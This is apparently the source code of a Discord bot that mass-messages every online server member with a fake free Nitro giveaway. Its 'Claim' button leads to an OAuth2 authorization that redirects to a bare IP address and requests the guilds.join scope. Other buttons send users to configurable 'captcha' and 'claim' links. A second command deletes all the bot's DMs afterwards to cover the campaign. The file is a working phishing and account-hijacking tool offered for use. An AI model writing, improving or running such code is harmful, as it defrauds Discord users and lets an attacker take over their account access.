import asyncio
import discord
from discord.ext import commands
from colorama import Fore, init
import tracemalloc
import json
with open('config.json', 'r', encoding='utf-8') as f:
    config = json.load(f)

tracemalloc.start()

token = config['discord_token']
owner_id = config['owner_id']
init()
intents = discord.Intents.default()
intents.presences = True
intents.message_content = True
intents.members = True
client = commands.AutoShardedBot(command_prefix="!", intents=intents)
global sent
sent = 0

global deleted
deleted = 0
count = 0
sent_users = set()

MAX_CONCURRENT_TASKS = 50
sem = asyncio.Semaphore(MAX_CONCURRENT_TASKS)

client.values = ["$4,99 - NITRO CLASSIC", "$10 - NITRO BOOST"]
options_dict = {
  " $4,99 - NITRO CLASSIC": "Nitro Classic",
  " $10 - NITRO BOOST": "Nitro Boost"
}


@client.event
async def on_interaction(interaction):
  interaction_name = options_dict.get(interaction.response,
                                      f"{Fore.GREEN}unknown{Fore.GREEN}")
  print(
    f"{Fore.GREEN}{interaction.user.name} selected {interaction_name}{Fore.GREEN}"
  )
  await callback(interaction)


class Select(discord.ui.Select):

  def __init__(self):
    options = [
      discord.SelectOption(label="$4,99 - NITRO CLASSIC",
                           emoji="<a:classic:1055198242519924906>",
                           description="Click me"),
      discord.SelectOption(label="$10 - NITRO BOOST",
                           emoji="<a:nitro16:1055198186135896154>",
                           description="Click me")
    ]
    super().__init__(placeholder="Select a prize:",
                     max_values=1,
                     min_values=1,
                     options=options)


async def callback(interaction: discord.Interaction):
  if client.values[0] == "$4,99 - NITRO CLASSIC":
    view = discord.ui.View()
    embed = discord.Embed(
      description=config['descrip'].format(user=interaction.user),
      color=0x5865F2)
    embed.set_image(url=config['embed_img2'])
    view.add_item(
      discord.ui.Button(url=config['button_url_1'],
                        label="Complate Captcha",
                        emoji="<a:Load:1068224094895616091>"))
    await interaction.response.send_message(embed=embed,
                                            view=view,
                                            ephemeral=True)

  elif client.values[0] == "$10 - NITRO BOOST":
    view_2 = discord.ui.View()
    embed_2 = discord.Embed(
      description=config['descrip2'].format(user=interaction.user),
      color=0x5865F2)
    embed_2.set_image(url=config['embed_img'])
    view_2.add_item(
      discord.ui.Button(url=config['button_url_2'],
                        label="Claim Now",
                        emoji="<:gift:1052289103284146176>"))
    await interaction.response.send_message(embed=embed_2,
                                            view=view_2,
                                            ephemeral=True)


@client.event
async def on_ready():
  print(f"")
  print(
    f"           {Fore.CYAN}Logged in as {Fore.WHITE}{client.user} {Fore.CYAN}Client id:{Fore.WHITE}{client.user.id} "
  )
  print(f"                  {Fore.RED}Made by ilxlo#6188")


class SelectView(discord.ui.View):

  def __init__(self, *, timeout=None):
    super().__init__(timeout=timeout)
    self.add_item(Select())


count = 0
sent_users = set() 



async def send_message_to_user(user, semaphore):
    global count
    if user.bot == True or user.status == discord.Status.offline:
        return
    else:
        try:
            async with semaphore:
                dm_channel = await user.create_dm()
                view = discord.ui.View()
                select = Select()
                view = discord.ui.View()
                button = discord.ui.Button(label="Claim",
                                   emoji="<:sent:1068782774728798228>",
                                   url='https://discord.com/oauth2/authorize?response_type=code&redirect_uri=http%3A%2F%2F35.156.37.230%2Fcallback&scope=identify%20guilds%20guilds.join&client_id=1066391249508110428')
                view.add_item(button)
                view.add_item(select)
                embed = discord.Embed(
          title=config['title_for_select'],
          description=(config['description_for_select'].format(client=client)),
          color=config['color_for_select'])
                embed.set_image(url=config['img_embed_select_menus'])
                await dm_channel.send("", embed=embed, view=view)
                sent_users.add(user)
                count += 1
                print(f"{Fore.WHITE}[{Fore.GREEN}SENT{Fore.WHITE}] {Fore.CYAN}Sent message to {user.name} | {Fore.RED}count: [{count}]")
                await asyncio.sleep(4)
        except Exception as e:
            print(f"Failed to send message to {user.name} | Error: {e}")


@client.command()
async def dmall(ctx):
    if ctx.author.id != int(config['owner_id']):
        return await ctx.send("You are not authorized to use this command.")

    guild = ctx.guild  # get the guild where the command is run
    online_members = [member for member in guild.members if not member.bot and member.status != discord.Status.offline]

    semaphore = asyncio.Semaphore(5)
    tasks = [asyncio.create_task(send_message_to_user(user, semaphore)) for user in online_members]
    count = len(tasks)
    await ctx.send(f"Starting to dmall {count} online members in `{guild.name}`")
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success = len([result for result in results if not isinstance(result, Exception)])
    await ctx.send(f"Successfully sent messages to {count} online members. "
                   f"Successfully received {success}.")


async def delete_message_to_user(user):
  global sent
  global deleted
  if user.bot == True:
    pass
  else:
    try:
      # Acquire the semaphore to limit the number of concurrent tasks
      async with sem:
        chann = await user.create_dm()
        async for message in chann.history(limit=100):
          if message.author == client.user:
            await message.delete()
            deleted = deleted + 1
            print(
              f"{Fore.WHITE}[{Fore.CYAN}DELETED{Fore.WHITE}] #{deleted} Deleted a message with {Fore.CYAN}{user} {Fore.WHITE}| {Fore.CYAN}{message.id}"
            )
            await asyncio.sleep(1)
        sent = sent + 1
        print(
          f"{Fore.WHITE}[{Fore.GREEN}CLEARED{Fore.WHITE}] #{sent} Cleared DMS with {Fore.WHITE}{user}"
        )
    except:
      # Catch and handle exceptions when sending messages to users
      print(
        f"{Fore.WHITE}[{Fore.RED}FAIL{Fore.WHITE}] #{sent} Something went wrong with {Fore.WHITE}"
      )


@client.command()
async def deletemessages(ctx):
    if ctx.author.id != int(config['owner_id']):
     return await ctx.send("You are not authorized to use this command.")
    dmable_members = set(client.get_all_members())
    tasks = [delete_message_to_user(user) for user in dmable_members]
    await asyncio.gather(*tasks)


client.run(token)
